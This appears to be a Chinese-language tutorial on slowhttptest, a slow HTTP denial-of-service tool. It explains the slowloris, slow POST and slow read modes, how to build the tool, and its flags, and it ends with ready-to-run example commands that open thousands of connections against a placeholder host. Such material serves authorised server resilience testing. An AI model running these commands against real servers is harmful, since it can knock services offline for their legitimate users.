> slowhttptest 慢攻击工具

slowhttptest介绍
---

Slowhttptest是依赖HTTP协议的慢速攻击DoS攻击工具，设计的基本原理是服务器在请求完全接收后才会进行处理，如果客户端的发送速度缓慢或者发送不完整，服务端为其保留连接资源池占用，大量此类请求并发将导致DoS。


攻击模式
----
**slowloris**：完整的http请求是以\r\n\r\n结尾，攻击时仅发送\r\n，少发送一个\r\n，服务器认为请求还未发完，就会一直等待直至超时。等待过程中占用连接数达到服务器连接数上限，服务器便无法处理其他请求。

**slow http post**：原理和slowloris有点类似，这次是通过声明一个较大的content-length后，body缓慢发送，导致服务器一直等待

**slow read attack**：向服务器发送一个正常合法的read请求，请求一个很大的文件，但认为的把TCP滑动窗口设置得很小，服务器就会以滑动窗口的大小切割文件，然后发送。文件长期滞留在内存中，消耗资源。这里有两点要注意：

1. tcp窗口设置要比服务器的socket缓存小，这样发送才慢。
2. 请求的文件要比服务器的socket缓存大，使得服务器无法一下子将文件放到缓存，然后去处理其他事情，而是必须不停的将文件切割成窗口大小，再放入缓存。同时攻击端一直说自己收不到。

slowhttptest安装
---
[github](https://github.com/shekyan/slowhttptest)

可从源码编译安装

    ./configure
    make && make install

参数说明
---
     -g      在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据
     -H      SlowLoris模式
     -B      Slow POST模式
     -R      Range Header模式
     -X      Slow Read模式
     -c      number of connections 测试时建立的连接数
     -d      HTTP proxy host:port  为所有连接指定代理
     -e      HTTP proxy host:port  为探测连接指定代理
     -i      seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。
     -l      seconds 测试维持时间
     -n      seconds 在Slow Read模式下，指定每次操作的时间间隔。
     -o      file name 使用-g参数时，可以使用此参数指定输出文件名
     -p      seconds 指定等待时间来确认DoS攻击已经成功
     -r      connections per second 每秒连接个数
     -s      bytes 声明Content-Length header的值
     -t      HTTP verb 在请求时使用什么操作，默认GET
     -u      URL  指定目标url
     -v      level 日志等级（详细度）
     -w      bytes slow read模式中指定tcp窗口范围下限
     -x      bytes 在slowloris and Slow POST tests模式中，指定发送的最大数据长度
     -y      bytes slow read模式中指定tcp窗口范围上限
     -z      bytes 在每次的read()中，从buffer中读取数据量
 
例子
----
slowloris模式：

     slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://host.example.com/index.html -x 24 -p 3
slow post模式：
    
     $ slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://host.example.com/loginform.html -x 10 -p 3
     
slow read模式：
    
     $ slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://host.example.com/resources/index.html -p 3